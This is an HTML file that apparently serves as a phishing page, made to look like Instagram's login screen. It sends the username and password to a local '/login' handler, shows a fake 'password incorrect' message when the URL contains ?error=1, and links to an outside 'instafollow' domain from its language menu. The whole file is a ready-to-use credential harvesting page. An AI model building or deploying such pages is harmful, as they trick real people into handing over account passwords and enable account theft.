<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram | Login</title>
  <link rel="stylesheet" href="instalogin/style.css" />
</head>
<body>
  <span id="root">
    <section class="section-all">
      <main class="main" role="main">
        <div class="wrapper">
          <article class="article">
            <div class="content">
              <div class="login-box">
                <div class="header">
                  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" />
                </div>

                <div class="form-wrap">
                  <form class="form" method="POST" action="/login">
                    
                    <div class="input-box">
                      <input type="text" name="username" placeholder="Phone number, username, or email" maxlength="30" autocapitalize="off" autocorrect="off" required />
                    </div>
                    
                    <div class="input-box">
                      <input type="password" name="password" placeholder="Password" maxlength="30" autocapitalize="off" autocorrect="off" required />
                    </div>
                    
                    <span class="button-box">
                      <button class="btn" type="submit">Log in</button>
                    </span>
                    
                    <div id="loginError" style="display: none;" class="login-error"></div>
                    <a class="forgot" href="#">Forgot password?</a>
                  </form>
                </div>
              </div>

              <div class="login-box">
                <p class="text">Don't have an account? <a href="#">Sign up</a></p>
              </div>

              <div class="app">
                <p>Get the app.</p>
                <div class="app-img">
                  <a href="https://itunes.apple.com/app/instagram/id389801252">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" />
                  </a>
                  <a href="https://play.google.com/store/apps/details?id=com.instagram.android">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png" />
                  </a>
                </div>
              </div>
            </div>
          </article>
        </div>
      </main>

      <footer class="footer" role="contentinfo">
        <div class="footer-container">
          <nav class="footer-nav" role="navigation">
            <ul>
              <li><a href="#">About Us</a></li>
              <li><a href="#">Support</a></li>
              <li><a href="#">Blog</a></li>
              <li><a href="#">Press</a></li>
              <li><a href="#">API</a></li>
              <li><a href="#">Jobs</a></li>
              <li><a href="#">Privacy</a></li>
              <li><a href="#">Terms</a></li>
              <li><a href="#">Directory</a></li>
              <li>
                <span class="language">Language
                  <select name="language" class="select" onchange="la(this.value)">
                    <option value="#">English</option>
                    <option value="http://ru-instafollow.bitballoon.com">Russian</option>
                  </select>
                </span>
              </li>
            </ul>
          </nav>
          <span class="footer-logo">&copy; 2025 Instagram</span>
        </div>
      </footer>
    </section>
  </span>

  <!-- Script -->
  <script>
    function la(src) {
      window.location = src;
    }
  
    const params = new URLSearchParams(window.location.search);
    const redirect = params.get('redirect');
    if (redirect) {
      const form = document.querySelector('form');
      form.action = `/login?redirect=${encodeURIComponent(redirect)}`;
    }
  
    // Tambahan agar menampilkan error saat URL mengandung ?error=1
    const urlError = params.get('error');
    if (urlError === '1') {
      const loginError = document.getElementById('loginError');
      loginError.style.display = 'block';
      loginError.innerText = 'Sorry, your password was incorrect. Please double-check your password.';
    }
  
    // Validasi form lokal
    document.querySelector('.form').addEventListener('submit', function (e) {
      const usernameInput = document.querySelector('input[name="username"]');
      const passwordInput = document.querySelector('input[name="password"]');
      const loginError = document.getElementById('loginError');
  
      usernameInput.classList.remove('error');
      passwordInput.classList.remove('error');
      loginError.style.display = 'none';
      loginError.innerHTML = '';
  
      if (usernameInput.value.trim() === '' || passwordInput.value.trim() === '') {
        e.preventDefault();
        usernameInput.classList.add('error');
        passwordInput.classList.add('error');
        loginError.style.display = 'block';
        loginError.innerText = 'Sorry, your password was incorrect. Please double-check your password.';
      }
    });
  </script>
  
</body>
</html>
